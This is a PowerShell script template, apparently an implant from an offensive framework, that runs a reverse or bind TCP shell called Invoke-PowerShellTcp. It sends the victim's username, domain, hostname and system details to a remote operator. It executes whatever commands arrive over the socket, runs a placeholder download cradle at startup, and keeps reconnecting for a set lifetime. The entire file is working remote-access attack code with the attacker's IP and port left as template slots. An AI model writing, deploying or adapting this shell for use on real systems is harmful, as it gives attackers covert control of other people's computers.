# Start-Job -ScriptBlock {

{{'$DebugPreference = "Continue"'|debug}}

$DL_CRADLE = @'
{{dl_cradle}}
'@

$elements = @{
    [Double] = 1
    [System.String] = 2
    [System.Collections.Hashtable] = 3
    [System.Object[]] = 4
    [Byte[]] = 5
    [System.Boolean] = 8
    [Int32] = 0x10
    [UInt64] = 0x11
    [Int64] = 0x12
};

$enc = [system.Text.Encoding]::UTF8

function ConvertTo-Bson {
    param([Parameter(Position = 0, Mandatory = $true)] $dict)
    $result = @()
    foreach ($key in $dict.keys) {
        $result += $elements[$dict[$key].gettype()]
        $result += $enc.getbytes($key)
        $result += 0
        # this is only for strings. TODO: consider other types than string.
        $result += [bitconverter]::GetBytes([Int32]($dict[$key].length+1))
        $result += $enc.getbytes($dict[$key])
        $result += 0
    }
    $result = [bitconverter]::GetBytes([Int32]($result.Length + 5)) + $result
    $result += 0
    $result
}

function ConvertFrom-Bson {
    param([Parameter(Position = 0, Mandatory = $true)] $array)
    $result = @{}
    $isKey = $True
    $i = 5
    while ($True) {
        $key = ""
        while ($True) {
            if ( $array[$i] -eq 0) { break }
            $key += $enc.GetString($array[$i])
            $i += 1
        }
        # TODO make more robust, ie. throw exceptions
        $val = ""
        $i += 5
        while ($True) {
            if ( $array[$i] -eq 0) { break }
            $val += $enc.GetString($array[$i])
            $i += 1
        }
        $result[$key] = $val
        if ($i -ge $array.length - 2 ) {break}
    }
    $result
}

function Invoke-PowerShellTcp
{

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String] $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int] $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch] $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch] $Bind,

        [Parameter(ParameterSetName="reverse", Mandatory = $false)]
        [Int] $Delay=10,

        [Parameter(ParameterSetName="reverse", Mandatory = $false)]
        [Int] $LifeTime=3
    )

    $id = ''
    1..4 | %{ $id += '{0:x}' -f (Get-Random -Max 256) }
    $creation_time = Get-Date -Format r

    function Read-ShellPacket {
        param (
            [Parameter(Position = 0)] $Stream
        )
        $i = $stream.Read($bytes, 0, 2)
        if ($i -eq 0) {
            $Null
        } else {
            $packet_type = $bytes[0..1]
            $stream.Read($bytes, 0, 4)
            $packet_length = $bytes[0..3]
            if ([BitConverter]::IsLittleEndian) {
                [Array]::reverse($packet_length)
            }
            $len = [BitConverter]::ToUInt32([byte[]]$packet_length, 0)
            $stream.Read($bytes, 0, $len)
            $body = $bytes[0..($len-1)]
            $body = [System.Text.Encoding]::UTF8.GetString($body)
            ConvertFrom-Bson $body
        }
    }

    function Write-ShellPacket {
        param (
            [Parameter(Position = 0)] $Packet,
            [Parameter(Position = 1)] $Stream
        )
        $body = [byte[]](ConvertTo-Bson $Packet)

        {{'Write-Debug $enc.getstring($body)'|debug}}
        $Stream.Write($body, 0, $body.length)
        $Stream.Flush()
    }

    function Get-ShellHello {
        @{
            "msg_type" = "SHELL_HELLO"
            "data" = @{
                "id" = $id
                "created" = $creation_time
                "user" = "$ENV:USERNAME"
                "domain" = "$ENV:USERDOMAIN"
                "hostname" = "$ENV:COMPUTERNAME"
                "arch" = "$ENV:PROCESSOR_ARCHITECTURE"
                "ps_version" = [String]$PSVersionTable.PSVersion
                "os_version" = [String]$PSVersionTable.BuildVersion
            }
        }
    }
    function Get-ShellPrompt {
        $PowerShell.Commands.Clear()
        [void]$PowerShell.AddScript("prompt")
        $prompt = ( $PowerShell.Invoke() )
        @{
            "msg_type" = "PROMPT"
            "data" = ($prompt[0])
        }
    }

    function Get-OutputStreams {
        param (
            [Parameter(Position = 0)] $Streams,
            [Parameter(Position = 1)] $Width = 80
        )
        $result = @()
        $Streams.Warning | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.Message }) }
        $Streams.Verbose | % { $result+=(@{ "msg_type" = "STREAM_VERBOSE"; "data" = $_.Message }) }
        $Streams.Debug | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.Message }) }
        $result += (@{ "msg_type" = "STREAM_PROGRESS"; "data" = $Streams.Progress })
        $Streams.Information.MessageData | % { $result+=(@{ "msg_type" = "STREAM_INFORMATION"; "data" = $_.Message }) }

        $Streams.ClearStreams()
        $result | ? { $_.data }
    }


    function Handle-Packets {

        #Create PowerShell object
        $PowerShell = [powershell]::Create()
        $Runspace = [runspacefactory]::CreateRunspace()
        $PowerShell.runspace = $Runspace
        $Runspace.Open()
        [void]$PowerShell.AddScript($DL_CRADLE)

        Write-ShellPacket (Get-ShellHello) $stream

        $init = ( $PowerShell.Invoke() | Out-String )

        Get-OutputStreams $PowerShell.Streams | % { Write-ShellPacket $_ $stream }

        Write-ShellPacket (Get-ShellPrompt) $stream

        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = ""
        while ( $packet = (Read-ShellPacket  $stream) ) {
            $output = ""
            if ($packet.msg_type -eq "COMMAND") {
                $data = $packet.data

                #Execute the command on the target.
                $PowerShell.Commands.Clear()
                [void]$PowerShell.AddScript($data)
                $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)

                #Get errors
                $PowerShell.Commands.Clear()
                [void]$PowerShell.AddScript('$error')
                $script_errors = ( $PowerShell.Invoke()  | Out-String -Width $packet.width )
                $PowerShell.Commands.Clear()
                [void]$PowerShell.AddScript('$error.clear()')
                $PowerShell.Invoke()

                if ($script_errors.length -gt 0) {
                    Write-ShellPacket @{ "msg_type" = "STREAM_ERROR"; "data" = $script_errors } $stream
                }

                Get-OutputStreams $PowerShell.Streams $packet.width | % {
                    Write-ShellPacket $_ $stream
                }

                Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
                Write-ShellPacket (Get-ShellPrompt) $stream
            } elseif ($packet.msg_type -eq "TABCOMPL") {
                $data = $packet.data
                $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
                $output = $x.CompletionMatches.CompletionText
                if (-not $output) { $output = "" }
                if ($output.gettype() -eq [System.String]) { $output = @($output) }

                Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
            } elseif ($packet.msg_type -eq "PING") {
                Write-ShellPacket @{ "msg_type" = "PONG"; "data" = "" } $stream
            } elseif ($packet.msg_type -eq "KILL") {
                $killed = $true
                Write-ShellPacket @{ "msg_type" = "KILL"; "data" = "confirm" } $stream
                Exit
            }
        }
    }

    $start_time = Get-Date
    $now = Get-Date
    $killed = $false
    while ( ($now - $start_time).TotalDays -lt $LifeTime -and -not $killed) {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
            if (-not $client) { Return }
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        # this the shell hello
        $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
        [byte[]]$bytes = 0..1024|%{0}

        Handle-Packets

        if ($client) { $client.Close() }
        if ($listener) {$listener.Stop()}

        Sleep $Delay
        $now = Get-Date
    }
}


Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse -Delay {{delay}} -LifeTime {{lifetime}}
# }
